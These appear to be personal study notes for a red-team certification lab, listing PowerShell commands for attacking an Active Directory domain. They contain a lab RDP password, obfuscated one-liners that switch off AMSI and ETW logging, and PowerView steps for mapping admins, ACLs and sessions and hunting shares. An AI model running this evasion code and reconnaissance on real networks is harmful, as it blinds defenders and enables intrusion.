```powershell
xfreerdp3 /u:student548 /p:cAyF6wTLSydnL2M7 /v:172.16.100.48 /dynamic-resolution /drive:AD,/home/adot/certifications/crtp/lab
```

```powershell
net use A: \\TSCLIENT\Tools

A:\tools\InviShell\RunWithRegistryNonAdmin.bat

[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```powershell
copy A:\tools\* .
```

```powershell
Import-Module .\PowerView.ps1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1, .\Invoke-SessionHunter.ps1
```

Basic enumeration
```powershell
Get-DomainUser | select cn

Get-DomainComputer | select dnshostname

Get-DomainGroupMember -Identity "Domain Admins" -recurse | select membername
Get-DomainGroupMember -Identity "Enterprise Admins" -recurse -domain moneycorp.local | select membername
```

ACLs - Perform on current user + groups user is in
```powershell
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs

Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student548"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDP Users"}

Get-DomainObjectAcl -SearchBase "LDAP://CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
```

OUs and GPOs
```powershell
Get-DomainOU -properties name
(Get-DomainOU -identity Applocked).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

Get-DomainGPO | select displayname
Get-DomainGPO -ComputerIdentity dcorp-std548
```

Domain and Forest trusts
```powershell
Get-DomainTrust
Get-ForestDomain -Forest <forest>
```

Local Admin access?
```powershell
Find-PSRemotingLocalAdminAccess
```

Create a servers.txt file
```powershell
Get-DomainComputer | select cn
```

Find DA sessions
```powershell
Invoke-SessionHunter -NoPortScan -Targets C:\Users\Public\servers.txt
```

Find shares
```powershell
Import-Module .\PowerHuntShares.psm1
```

```powershell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\Users\Public -HostList C:\Users\Public\servers.txt

Invoke-ShareFinder -Verbose
```


**REVIEW WHAT PRIVILEGES A USER HAS AFTER COMPROMISE**